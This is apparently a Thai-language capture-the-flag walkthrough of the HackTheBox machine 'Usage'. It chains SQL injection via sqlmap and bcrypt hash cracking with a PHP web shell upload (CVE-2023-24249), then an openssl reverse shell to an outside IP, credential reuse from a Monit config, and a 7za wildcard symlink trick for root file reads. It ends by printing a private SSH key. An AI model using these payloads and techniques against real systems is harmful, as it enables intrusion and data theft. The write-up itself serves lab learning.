# Recon

```bash
sudo ../Tools/scan.sh 10.10.11.18             
[sudo] password for kali: 
[*] Running rustscan...
[*] Running nmap on ports: 22,80
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-31 10:10 EDT
Nmap scan report for 10.10.11.18
Host is up (0.034s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.98 seconds

```

## TCP 80 

## Sub domain recon 
```bash
wfuzz -u http://usage.htb -H "Host: FUZZ.usage.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 178
```

ทั้งนี้ใช้ -hh = 178 เนื่องจากต้องการตรวจสอบผลลัพท์ที่มีขนาดตัวอักษรที่ไม่ใช่ 178 

![](./IMG/001.png)

จาพผลลัพธ์จะพบว่ามี admin.usage.htb อยู่ จึงทำการเพิ่มไปที่ไฟล์ /etc/hosts
![](./IMG/002.png)

![](./IMG/003.png)

หากทดสอบ register จะพบว่าเราสามารถเข้ามาใน Dashboard ของระบบได้ 

![](./IMG/004.png)

หากสืบค้นเพิ่มเติมจะพบหน้าของ /index ซึ่งใช้ Laravel ซึ่งมีการแสดงผลเป็น 404| Not Found ดังภาพ 
![](./IMG/005.png)

ซึ่งหากเราทำการค้นหาใน Google Image จะพบว่าเป็นหน้า Error Page ของ Laravel จริง 
![](./IMG/006.png)

หากเราตรวจสอบไปใน Tech Stack จะพบว่า Laravel มีการใช้ cookie 
![](./IMG/007.png)

1. **XSRF-TOKEN**
- เป็น token ที่ Laravel สร้างขึ้นเพื่อช่วยป้องกัน **CSRF (Cross-Site Request Forgery)**
- ถูกเซ็ตเป็น HTTP cookie เมื่อผู้ใช้เข้ามาที่เว็บไซต์
- JavaScript Frameworks เช่น Vue.js, Axios สามารถอ่าน XSRF-TOKEN นี้จาก cookie และนำไปใส่ใน header ของ request (เช่น `X-XSRF-TOKEN`) เพื่อยืนยันว่า request มาจากผู้ใช้งานจริง ๆ
1. **[app]_session cookie**
- เป็น session cookie ที่ Laravel ใช้เก็บ ID ของ session สำหรับผู้ใช้งานคนนั้น
- ปกติจะมีชื่อเป็น `laravel_session` (เพราะค่า default ของ `[app]` คือ "laravel")
- ชื่อนี้สามารถเปลี่ยนได้โดยการแก้ไฟล์ config: `config/session.php` โดยปรับค่า `cookie` ตรงส่วน `'session.cookie'`

ตัวอย่างการเปลี่ยนชื่อ session cookie:
เปิดไฟล์ `config/session.php` และแก้ไข:

```php
'session.cookie' => 'myapp_session',
```

หลังจากนั้น cookie จะถูกตั้งชื่อเป็น `myapp_session` แทน `laravel_session`

สรุปได้ว่า 
- **XSRF-TOKEN**: ใช้ป้องกัน CSRF โดย frontend framework
- **[app]_session**: เก็บ session ID ของผู้ใช้ (ชื่อเริ่มต้นคือ `laravel_session`)
- คุณสามารถเปลี่ยนชื่อ session cookie ได้ใน `config/session.php`


# SQL injection

หากเราทดสอบว่าสามารถทำ sql injection ได้หรือไม่เราสามารถใส่ Single Qoude ได้ โดยพบว่า server ตอบกลับมาเป็น error นั่นหมายความว่าระบบมีโอกาศจะมีช่องโหว่ SQLi 
![](./IMG/008.png)

![](./IMG/009.png)
ทดสอบแก้ไข payload จะพบว่าเราสามารถทำ SQLi ได้ 

![](./IMG/010.png)

เราจะเก็บข้อมูลของ POST Request ของหน้าดังกล่าวและโจมตีไปที่ parameter email ทั้งนี้หากใช้ mode ปกติของ sqlmap จะไม่สามารถใช้ได้ จึงต้องเพิ่ม parameter สำหรับโจมตีดังต่อไปนี้ 

## Enum DB using sqlmap 

```bash
sqlmap -r post.request --level 5 --risk 3 --threads 10 -p email --batch
```
รายละเอียดแต่ละพารามิเตอร์ในคำสั่ง:

| ส่วนของคำสั่ง     | ความหมาย                                                                              |
| ----------------- | ------------------------------------------------------------------------------------- |
| `sqlmap`          | เรียกใช้งานโปรแกรม SQLMap                                                             |
| `-r post.request` | อ่าน request จากไฟล์ `post.request` ที่คุณบันทึกไว้ เช่น จาก Burp Suite               |
| `--level 5`       | กำหนดระดับการทดสอบ SQLi ตั้งแต่ 1-5 (5 = ตรวจสอบมากที่สุด)                            |
| `--risk 3`        | กำหนดระดับความเสี่ยงของการทดสอบ SQLi ตั้งแต่ 1-3 (3 = ทดสอบแบบที่อาจกระทบระบบจริงได้) |
| `--threads 10`    | ใช้ 10 threads ในการโจมตีพร้อมกัน เพื่อเพิ่มความเร็ว                                  |
| `-p email`        | ระบุว่าต้องการตรวจสอบเฉพาะ parameter ที่ชื่อ `email`                                  |
| `--batch`         | ใช้ค่า default ทั้งหมดโดยไม่รอให้ผู้ใช้ตอบคำถามระหว่างทำงาน                           |
![](./IMG/011.png)
ข้อมูลข้างต้นทำให้ทราบได้ว่าเป็นฐานข้อมูลชนิด MySQL  และต่อมาตรวจสอบ DBS 
## Enum DBS name 

```bash
sqlmap -r post.request --level 5 --risk 3 --threads 10 -p email --batch --dbs
```

จากภาพด้านล่างทำให้เห็นว่ามี database ชื่อ usage_blog อยู่ 
![](./IMG/012.png)

## Enum Tables usage_blog 

```bash
sqlmap -r post.request --level 5 --risk 3 --threads 10 -p email --batch -D usage_blog --tables
```

![](./IMG/013.png)

## Dump admin

```bash
sqlmap -r post.request --level 5 --risk 3 --threads 10 -p email --batch -D usage_blog -T admin_users --dump

| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |

```

![](./IMG/014.png)


# Crack Hash

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ vim admin.hash

$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2


┌──(kali㉿kali)-[~/Desktop]
└─$ hashcat admin.hash  /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu--0x000, 2909/5883 MB (1024 MB allocatable), 4MCU

The following 4 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce

Please specify the hash-mode with -m [hash-mode].

Started: Sat May 31 11:06:46 2025
Stopped: Sat May 31 11:06:47 2025
                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop]
└─$ 

```

จากการตรวจสอบจะพบว่าเป็น hash ชนิด bcrypt 

```bash
hashcat admin.hash  /usr/share/wordlists/rockyou.txt -m 3200

$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2:whatever1

admin:whatever1
```

# Exploit web admin

หน้าดังกล่าวเป็นหน้าของ Laravel Admin version 1.8.17 

![](./IMG/015.png)

จากข้อมูลข้างต้นทำให้ทราบได้ว่าเวอร์ชันดังกล่าวมีช่องโหว่ [CVE-2023-24249](https://security.snyk.io/vuln/SNYK-PHP-ENCORELARAVELADMIN-3333096)  

สร้างไฟล์สำหรับ upload โดยตั้งชือเป็น ice.php.jpg
```php
<?php system($_REQUEST['cmd']); ?>
```
จากนั้นทำการ intercep แล้วเปลี่ยน filename เป็น ice.php 

![](./IMG/017.png)
ซึ่งจะสามารถ upload ได้ 
![](./IMG/016.png)

![](./IMG/018.png)

# Shell as dash 

```htp
http://admin.usage.htb/uploads/images/ice.php?cmd=mkfifo%20%2Ftmp%2Fs%3B%20%2Fbin%2Fsh%20-i%20%3C%20%2Ftmp%2Fs%202%3E%261%20|%20openssl%20s_client%20-quiet%20-connect%2010.10.14.34%3A443%20%3E%20%2Ftmp%2Fs%3B%20rm%20%2Ftmp%2Fs
```

![](./IMG/019.png)


# Shell as xander

หากสำรวจใน home ของ dash จะพบว่ามีไฟล์ .monit อยู่จำนวนมาก​ซึ่งหากหาข้อมูลเพิ่มเติมจะพบว่าเป็น **Monit** ซึ่งเป็นเครื่องมือระบบสำหรับการจัดการและตรวจสอบ (monitor) เครื่อง Unix/Linux โดยเฉพาะ 

![](./IMG/020.png)

```bash
dash@usage:~$ cat .monitrc
cat .monitrc
#Monitoring Interval in Seconds
set daemon  60

#Enable Web Access
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd

#Apache
check process apache with pidfile "/var/run/apache2/apache2.pid"
    if cpu > 80% for 2 cycles then alert


#System Monitoring 
check system usage
    if memory usage > 80% for 2 cycles then alert
    if cpu usage (user) > 70% for 2 cycles then alert
        if cpu usage (system) > 30% then alert
    if cpu usage (wait) > 20% then alert
    if loadavg (1min) > 6 for 2 cycles then alert 
    if loadavg (5min) > 4 for 2 cycles then alert
    if swap usage > 5% then alert

check filesystem rootfs with path /
       if space usage > 80% then alert
dash@usage:~$ 

```

จากข้อมูลข้างต้นเราจะพบข้อมูลสำคัญซึ่งอาจะเป็นรหัสผ่านของ xander ได้ 

```bash
sshpass -p '3nc0d3d_pa$$w0rd' ssh xander@usage.htb
```

# Shell as root 

```bash
xander@usage:~$ sudo -l
Matching Defaults entries for xander on usage:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management

```

## String file 
```bash
xander@usage:~$ strings /usr/bin/usage_management 
/lib64/ld-linux-x86-64.so.2
chdir
__cxa_finalize
__libc_start_main
puts
system
__isoc99_scanf
perror
printf
libc.so.6
GLIBC_2.7
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
/var/www/html
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
Error changing working directory to /var/www/html
/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql
Password has been reset.
Choose an option:
1. Project Backup
2. Backup MySQL data
3. Reset admin password
Enter your choice (1/2/3): 
Invalid choice.
:*3$"
GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
usage_management.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
backupMysqlData
__libc_start_main@GLIBC_2.34
_ITM_deregisterTMCloneTable
puts@GLIBC_2.2.5
_edata
_fini
chdir@GLIBC_2.2.5
backupWebContent
system@GLIBC_2.2.5
printf@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
_end
__bss_start
main
resetAdminPassword
perror@GLIBC_2.2.5
__isoc99_scanf@GLIBC_2.7
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
_init
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
xander@usage:~$ 

```

**พบช่องโหว่การใช้ Wildcard (`*`) ในคำสั่ง `7z` หรือ `7za` สามารถถูกโจมตีได้โดยใช้ไฟล์ที่ชื่อเริ่มต้นด้วย @ และ symlink เพื่ออ่านไฟล์สำคัญโดยไม่ได้รับอนุญาต**

เทคนิคการโจมตี (Wildcard Symbolic Link Attack):
1. **สร้างไฟล์สองไฟล์:**
   - ไฟล์หนึ่งชื่อ `@whatever`
   - อีกไฟล์ชื่อ `whatever` ซึ่งเป็น **symlink** ไปยังไฟล์ที่เราต้องการอ่าน เช่น `/etc/passwd`

2. **เมื่อใช้ `7z` กับ wildcard เช่น:**
   ```bash
 /usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
   ```
   มันจะแปลงคำสั่งเป็น:
   ```bash
   7za a archive.zip -tzip -snl -mmt -- @whatever whatever [files...]
   ```

3. **7z จะเห็น `@whatever` และพยายามอ่านเนื้อหาของ `whatever` เป็นรายการไฟล์**
   - แต่ถ้า `whatever` เป็น symlink มันจะตามไปอ่านไฟล์ปลายทางแทน
   - แม้ว่าจะไม่ใช่รายการไฟล์จริง ๆ แต่ 7z ก็จะแสดงข้อความผิดพลาดที่มีเนื้อหาของไฟล์นั้น

4. **ผลลัพธ์:** เราสามารถดึงข้อมูลจากไฟล์ใด ๆ ได้ เช่น `/etc/shadow`, `/root/.ssh/id_rsa` ฯลฯ โดยไม่ต้องเปิดไฟล์โดยตรง

อ้างอิง https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html#id-7z 

## 7z Exploit 
```
cd /var/www/html
touch @ice; ln -fs /root/root.txt ice
sudo usage_management
```


![](./IMG/021.png)


```id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
-----END OPENSSH PRIVATE KEY-----
```

# PWNED 